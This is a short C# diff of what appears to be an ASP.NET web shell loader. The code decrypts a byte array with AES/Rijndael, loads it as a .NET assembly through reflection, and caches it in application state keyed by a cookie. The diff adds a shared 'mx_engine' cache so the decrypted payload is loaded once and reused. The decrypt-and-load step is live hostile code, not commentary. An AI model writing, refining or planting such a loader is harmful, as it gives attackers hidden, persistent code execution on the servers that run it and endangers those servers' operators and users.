@@ -10,10 +10,15 @@
                                 var assembly = appcontext.Application.Get(cookieValue);
                                 if (assembly == null)
                                 {
+                                    assembly = appcontext.Application.Get("mx_engine");
+                                    if (assembly == null)
+                                    {
+                                        assembly = System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length));
+                                        appcontext.Application.Set("mx_engine", assembly);
+                                    }
                                     var cookie = new HttpCookie(cookieName, System.Guid.NewGuid().ToString("N"));
                                     cookieValue = cookie.Value;
                                     appcontext.Response.Cookies.Add(cookie);
-                					assembly = System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length));
                                     appcontext.Application.Set(cookieValue, assembly);
                                 }
                                 else
